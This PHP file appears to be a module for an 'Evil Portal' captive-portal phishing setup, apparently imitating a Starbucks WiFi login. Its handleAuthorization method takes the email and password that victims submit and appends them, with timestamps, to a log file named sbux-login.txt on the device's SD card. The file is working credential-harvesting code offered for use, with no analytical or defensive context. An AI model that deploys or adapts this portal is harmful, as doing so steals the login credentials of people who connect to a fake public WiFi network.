<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        if (!is_dir('/sd/evilportal-logs/')) {

          mkdir('/sd/evilportal-logs/');
        }

        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            file_put_contents("/sd/evilportal-logs/sbux-login.txt", date('Y-m-d H:i:s') .  " {$email} - {$pwd}\n", FILE_APPEND);
        }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
